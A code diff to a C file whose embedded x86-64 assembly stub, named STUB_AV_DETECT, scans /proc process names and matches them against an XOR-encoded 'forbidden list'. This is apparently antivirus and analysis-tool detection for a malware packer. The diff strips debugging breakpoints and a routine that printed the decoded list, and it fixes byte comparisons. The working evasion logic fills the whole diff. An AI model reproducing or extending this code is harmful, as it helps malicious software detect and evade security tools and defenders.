@@ -71,26 +71,27 @@ static const char STUB_AV_DETECT[] =
 "mov rsi, rsp\n"
 "mov rdx, 4096\n"
 "syscall\n"
-"break\n" // BATMAN
+"break\n"
 "cmp rax, 0\n"
 "jle exit_clean\n"
 
 "mov rbx, rsp\n"
-"add rbx, rax\n"        //; fin des octets lus
-"mov rbp, rsp\n"        //; entrée courante (linux_dirent64)
+"add rbx, rax\n"
+"mov rbp, rsp\n"
 
 "process_entry_loop:\n"
 "cmp rbp, rbx\n"
 "jge scan_loop\n"
 
-    //; Vérifier d_type == 2 (DT_DIR) à [rbp+18]
+    //; Garder uniquement les noms commençant par '0'..'9' ([rbp+19])
 "_ZERO eax\n"
-"_SET al, [rbp+18]\n"
-//"cmp al, 2\n"
-//"jne next_entry\n"
-//"jmp next_entry\n"
+"_SET al, [rbp+19]\n"
+"cmp al, 48\n"
+"jl next_entry\n"
+"cmp al, 57\n"
+"jg next_entry\n"
 
-    //; Construit "/proc/<PID>/comm" dans path_buffer ([rsp+4352])
+    //; Construire "/proc/<PID>/comm" dans [rsp+4352]
 "lea rdi, [rsp]\n"
 "add rdi, 4352\n"
 "lea rsi, [proc_prefix]\n"
@@ -103,7 +104,7 @@ static const char STUB_AV_DETECT[] =
 "_INC rdi\n"
 "jmp copy_prefix\n"
 "copy_prefix_done:\n"
-"lea rsi, [rbp+19]\n"   //; d_name
+"lea rsi, [rbp+19]\n"
 "copy_pid:\n"
 "_SET al, [rsi]\n"
 "cmp al, 0\n"
@@ -132,7 +133,7 @@ static const char STUB_AV_DETECT[] =
 "jl next_entry\n"
 "mov r10, rax\n"
 
-    //; Lire comm dans process_name ([rsp+4096])
+    //; Lire comm dans [rsp+4096]
 "mov rax, 0\n"
 "mov rdi, r10\n"
 "lea rsi, [rsp]\n"
@@ -154,7 +155,7 @@ static const char STUB_AV_DETECT[] =
 "_ZERO rcx\n"
 "_STORE [rsi + rax], cl\n"
 
-    //; Remplacer '\n' final par '\0'
+    //; Remplacer '\n' (10) par '\0' (0)
 "strip_newline:\n"
 "_SET al, [rsi]\n"
 "cmp al, 0\n"
@@ -168,12 +169,12 @@ static const char STUB_AV_DETECT[] =
 "_STORE [rsi], al\n"
 "strip_done:\n"
 
-    //; ── DISPLAY : affiche le nom de processus lu ([rsp+4096]) ──
+    //; Afficher le nom de processus lu ([rsp+4096])
 "push rbx\n"
 "push rbp\n"
 "push r10\n"
 "push r12\n"
-"lea rsi, [rsp + 4128]\n" //; 4096 + 4*8 octets pushés
+"lea rsi, [rsp + 4128]\n"
 "call strlen\n"
 "mov rdx, rax\n"
 "mov rax, 1\n"
@@ -189,57 +190,23 @@ static const char STUB_AV_DETECT[] =
 "pop r10\n"
 "pop rbp\n"
 "pop rbx\n"
-    //; ── FIN DISPLAY ──
 
-    //; Comparer contre forbidden_list
+    //; Comparer contre forbidden_list (XOR 42)
 "lea rsi, [forbidden_list]\n"
 "check_forbidden:\n"
-"cmp [rsi], 0\n"
-"je next_entry\n"
-
-    //; ── DISPLAY : affiche l'entrée forbidden_list décodée ──
-"push rsi\n"
-"push rbx\n"
-"push rbp\n"
-"push r10\n"
-"push r12\n"
-"mov r8, rsi\n"
-"print_forb_loop:\n"
-"_ZERO rax\n"
-"_SET al, [r8]\n"
+"_ZERO eax\n"
+"_SET al, [rsi]\n"
 "cmp al, 0\n"
-"je print_forb_done\n"
-"xor al, 42\n"
-"push rax\n"
-"mov rax, 1\n"
-"mov rdi, 1\n"
-"mov rsi, rsp\n"
-"mov rdx, 1\n"
-"syscall\n"
-"pop rax\n"
-"_INC r8\n"
-"jmp print_forb_loop\n"
-"print_forb_done:\n"
-"mov rax, 1\n"
-"mov rdi, 1\n"
-"lea rsi, [newline]\n"
-"mov rdx, 1\n"
-"syscall\n"
-"pop r12\n"
-"pop r10\n"
-"pop rbp\n"
-"pop rbx\n"
-"pop rsi\n"
-    //; ── FIN DISPLAY ──
-
+"je next_entry\n"
 "lea rdi, [rsp]\n"
 "add rdi, 4096\n"
 "call strcmp\n"
 "test rax, rax\n"
-"break\n" // BATMAN
 "jz found_forbidden\n"
 "advance_forbidden:\n"
-"cmp [rsi], 0\n"
+"_ZERO eax\n"
+"_SET al, [rsi]\n"
+"cmp al, 0\n"
 "je check_forbidden\n"
 "inc rsi\n"
 "jmp advance_forbidden\n"
@@ -320,7 +287,9 @@ static const char STUB_AV_DETECT[] =
 "strlen:\n"
 "xor rax, rax\n"
 "strlen_loop:\n"
-"cmp [rsi+rax], 0\n"
+"_ZERO edx\n"
+"_SET dl, [rsi+rax]\n"
+"cmp dl, 0\n"
 "je strlen_done\n"
 "inc rax\n"
 "jmp strlen_loop\n"
